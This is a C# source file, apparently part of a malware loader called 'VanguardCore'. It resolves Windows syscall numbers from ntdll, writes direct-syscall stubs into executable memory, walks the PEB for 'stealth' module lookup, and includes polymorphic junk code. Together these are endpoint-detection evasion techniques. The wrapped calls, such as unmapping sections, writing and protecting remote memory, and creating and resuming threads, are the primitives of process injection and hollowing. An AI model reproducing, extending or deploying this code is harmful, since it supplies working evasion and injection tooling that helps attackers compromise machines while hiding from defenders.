using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text;

namespace VanguardCore
{
    public static class SyscallManager
    {
        // [POLY_JUNK]
        private static void _vanguard_5a1893d7() {
            int val = 16994;
            if (val > 50000) Console.WriteLine("Hash:" + 16994);
        }

        // Typed Delegates for Critical Syscalls
        public delegate uint NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref UIntPtr regionSize, uint allocationType, uint protect);
        public delegate uint NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferLength, out IntPtr bytesWritten);
        public delegate uint NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferLength, out IntPtr bytesRead);
        public delegate uint NtUnmapViewOfSection(IntPtr processHandle, IntPtr baseAddress);
        public delegate uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION processInformation, uint processInformationLength, out uint returnLength);
        public delegate uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);
        public delegate uint NtResumeThread(IntPtr threadHandle, out uint suspendCount);
        public delegate uint NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref UIntPtr regionSize, uint freeType);
        public delegate uint NtTerminateProcess(IntPtr processHandle, uint exitStatus);
        public delegate uint NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref uint regionSize, uint newProtect, out uint oldProtect);

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSCALL_ENTRY
        {
            public uint SSN;
            public IntPtr pAddress;
        }

        private static Dictionary<uint, SYSCALL_ENTRY> _syscallCache = new Dictionary<uint, SYSCALL_ENTRY>();
        private static bool _initialized = false;

        public static uint DJB2(string s)
        {
            uint hash = 5381;
            foreach (char c in s) hash = ((hash << 5) + hash) + (uint)c;
            return hash;
        }

        public static void Initialize()
        {
            if (_initialized) return;
            try
            {
                IntPtr ntdll = GetModuleHandle("ntdll.dll");
                if (ntdll == IntPtr.Zero) return;

                string[] criticalTable = {
                    "NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtReadVirtualMemory",
                    "NtQueryInformationProcess", "NtUnmapViewOfSection", "NtCreateThreadEx", "NtResumeThread",
                    "NtFreeVirtualMemory", "NtTerminateProcess", "NtProtectVirtualMemory"
                };

                foreach (string name in criticalTable)
                {
                    uint hash = DJB2(name);
                    SYSCALL_ENTRY entry = FindSyscall(ntdll, name);
                    if (entry.pAddress != IntPtr.Zero) _syscallCache[hash] = entry;
                }
                _initialized = true;
            }
            catch { }
        }

        private static SYSCALL_ENTRY FindSyscall(IntPtr hModule, string functionName)
        {
            SYSCALL_ENTRY entry = new SYSCALL_ENTRY { SSN = 0, pAddress = IntPtr.Zero };
            try
            {
                IntPtr pFunc = GetProcAddress(hModule, functionName);
                if (pFunc == IntPtr.Zero) return entry;

                byte[] buffer = new byte[32];
                Marshal.Copy(pFunc, buffer, 0, 32);
                for (int i = 0; i < 20; i++)
                {
                    if (buffer[i] == 0xB8) // mov eax, imm32
                    {
                        entry.SSN = BitConverter.ToUInt32(buffer, i + 1);
                        entry.pAddress = pFunc;
                        break;
                    }
                }
            }
            catch { }
            return entry;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, IntPtr procOrdinal);
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public IntPtr[] Reserved2;
            public IntPtr UniqueProcessId;
            public IntPtr Reserved3;
        }

        private static Dictionary<uint, IntPtr> _stubCache = new Dictionary<uint, IntPtr>();

        public static T GetSyscallDelegate<T>(string funcName) where T : Delegate
        {
            uint hash = DJB2(funcName);
            if (!_syscallCache.ContainsKey(hash)) return null;

            if (!_stubCache.ContainsKey(hash))
            {
                SYSCALL_ENTRY entry = _syscallCache[hash];
                byte[] code;

                if (IntPtr.Size == 8) // x64
                {
                    code = new byte[] {
                        0x4C, 0x8B, 0xD1,               // mov r10, rcx
                        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, <SSN>
                        0x0F, 0x05,                     // syscall
                        0xC3                            // ret
                    };
                }
                else // x86
                {
                    code = new byte[] {
                        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, <SSN>
                        0x8B, 0xD4,                     // mov edx, esp
                        0x0F, 0x34,                     // sysenter
                        0xC3                            // ret
                    };
                }

                Buffer.BlockCopy(BitConverter.GetBytes(entry.SSN), 0, code, (IntPtr.Size == 8 ? 4 : 1), 4);
                
                IntPtr pStub = Native.VirtualAlloc(IntPtr.Zero, (UIntPtr)code.Length, 0x1000 | 0x2000, 0x40);
                Marshal.Copy(code, 0, pStub, code.Length);
                _stubCache[hash] = pStub;
            }

            return Marshal.GetDelegateForFunctionPointer<T>(_stubCache[hash]);
        }

        public static void Cleanup()
        {
            foreach (var stub in _stubCache.Values)
            {
                Native.VirtualFree(stub, UIntPtr.Zero, 0x8000); // MEM_RELEASE
            }
            _stubCache.Clear();
            _initialized = false;
        }

        private static class Native
        {
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
        }

        public static IntPtr StealthGetModuleBase(string moduleName)
        {
            var ntQuery = GetSyscallDelegate<NtQueryInformationProcess>("NtQueryInformationProcess");
            if (ntQuery == null) return GetModuleHandle(moduleName);

            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            uint retLen;
            ntQuery((IntPtr)(-1), 0, ref pbi, (uint)Marshal.SizeOf(pbi), out retLen);

            IntPtr ldr = Marshal.ReadIntPtr(pbi.PebBaseAddress, IntPtr.Size == 8 ? 0x18 : 0x0C);
            IntPtr head = Marshal.ReadIntPtr(ldr, IntPtr.Size == 8 ? 0x10 : 0x0C); // InLoadOrderModuleList
            IntPtr curr = head;

            while (true)
            {
                IntPtr namePtr = Marshal.ReadIntPtr(curr, IntPtr.Size == 8 ? 0x58 : 0x2C);
                if (namePtr != IntPtr.Zero)
                {
                    ushort len = (ushort)Marshal.ReadInt16(curr, IntPtr.Size == 8 ? 0x48 : 0x24);
                    byte[] nameBuf = new byte[len];
                    Marshal.Copy(namePtr, nameBuf, 0, len);
                    string name = Encoding.Unicode.GetString(nameBuf);

                    if (name.IndexOf(moduleName, StringComparison.OrdinalIgnoreCase) >= 0)
                        return Marshal.ReadIntPtr(curr, IntPtr.Size == 8 ? 0x30 : 0x18); // DllBase
                }
                curr = Marshal.ReadIntPtr(curr, 0); // Flink
                if (curr == head || curr == IntPtr.Zero) break;
            }

            return GetModuleHandle(moduleName);
        }
    }
}
